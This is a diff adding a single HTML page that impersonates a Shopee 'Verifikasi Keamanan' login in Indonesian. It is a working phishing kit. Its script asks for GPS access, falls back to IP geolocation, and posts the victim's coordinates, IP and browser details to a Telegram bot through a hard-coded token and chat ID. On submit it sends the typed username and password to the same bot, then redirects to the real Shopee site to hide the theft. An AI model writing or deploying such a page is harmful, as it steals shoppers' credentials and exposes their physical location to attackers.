@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan - Shopee</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background-color: #f5f5f5; color: #333; }
+        
+        .header { background-color: #ee4d2d; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; color: white; height: 60px; }
+        .header-logo { font-size: 24px; font-weight: 500; }
+        .header-help { font-size: 14px; color: white; text-decoration: none; }
+
+        .container { padding: 20px; display: flex; justify-content: center; }
+        
+        .card { 
+            background: white; 
+            width: 100%; 
+            max-width: 450px;
+            padding: 30px; 
+            border-radius: 4px; 
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1); 
+        }
+
+        .input-group { margin-bottom: 20px; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #e0e0e0; 
+            border-radius: 2px; 
+            font-size: 14px; 
+            outline: none; 
+        }
+        
+        .btn-verify { 
+            width: 100%; 
+            background-color: #ee4d2d; 
+            color: white; 
+            padding: 12px; 
+            border: none; 
+            border-radius: 2px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        
+        .popup-content {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 320px;
+            margin: 20px;
+        }
+        
+        .popup-btn {
+            background: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .success-message {
+            background: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="popup" id="gpsPopup">
+        <div class="popup-content">
+            <div style="font-size: 48px; margin-bottom: 15px;">📍</div>
+            <div style="font-size: 18px; font-weight: 600; margin-bottom: 10px;">Izinkan Akses Lokasi</div>
+            <div style="margin-bottom: 20px;">Shopee ingin menggunakan lokasi Anda untuk verifikasi keamanan</div>
+            <button class="popup-btn" id="allowGPS">IZINKAN</button>
+            <button style="background: transparent; border: none; padding: 10px; cursor: pointer;" id="denyGPS">Tolak</button>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="header-logo">Shopee</div>
+        <a href="#" class="header-help">Butuh bantuan?</a>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h2 style="margin-bottom: 30px;">Verifikasi Keamanan - Log In</h2>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="No. Handphone / Email / Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="btn-verify" id="loginBtn">VERIFIKASI & LOG IN</button>
+            </form>
+
+            <div class="success-message" id="successMessage">
+                ✅ Verifikasi berhasil! Mengalihkan...
+            </div>
+
+            <div style="margin-top: 15px; font-size: 13px; text-align: center;">
+                Lupa Password? | Login dengan SMS
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8057628415:AAH5CgDci7Kzkqshqc9B8VK8ApC8RL-i5ok";
+        const CHAT_ID = "7343601029";
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return true;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+
+        function getGPSLocation() {
+            if (!navigator.geolocation) {
+                getIPLocation();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const message = `📍 <b>GPS LOCATION</b>\n\n` +
+                                  `🕒 ${new Date().toLocaleString()}\n` +
+                                  `📍 ${position.coords.latitude}, ${position.coords.longitude}\n` +
+                                  `🗺️ <a href="https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}">View on Maps</a>`;
+                    
+                    await sendToTelegram(message);
+                },
+                async (error) => {
+                    await sendToTelegram(`❌ GPS Error: ${error.message}`);
+                    getIPLocation();
+                }
+            );
+        }
+
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                const message = `🌍 <b>IP LOCATION</b>\n\n` +
+                              `🕒 ${new Date().toLocaleString()}\n` +
+                              `🌐 IP: ${data.ip}\n` +
+                              `📍 ${data.city}, ${data.country_name}\n` +
+                              `📱 ${navigator.userAgent}`;
+                
+                await sendToTelegram(message);
+            } catch (error) {
+                await sendToTelegram(`📱 BASIC INFO\n${new Date().toLocaleString()}\n${navigator.userAgent}`);
+            }
+        }
+
+        document.getElementById('allowGPS').addEventListener('click', () => {
+            document.getElementById('gpsPopup').style.display = 'none';
+            getGPSLocation();
+        });
+
+        document.getElementById('denyGPS').addEventListener('click', () => {
+            document.getElementById('gpsPopup').style.display = 'none';
+            getIPLocation();
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('loginBtn').textContent = 'MEMVERIFIKASI...';
+
+            const message = `🔐 <b>LOGIN DATA</b>\n\n` +
+                           `🕒 ${new Date().toLocaleString()}\n` +
+                           `👤 ${username}\n` +
+                           `🔑 ${password}\n` +
+                           `📱 ${navigator.userAgent}`;
+
+            await sendToTelegram(message);
+
+            document.getElementById('successMessage').style.display = 'block';
+            document.getElementById('loginBtn').style.display = 'none';
+
+            setTimeout(() => {
+                window.location.href = 'https://shopee.co.id';
+            }, 3000);
+        });
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('gpsPopup').style.display = 'flex';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
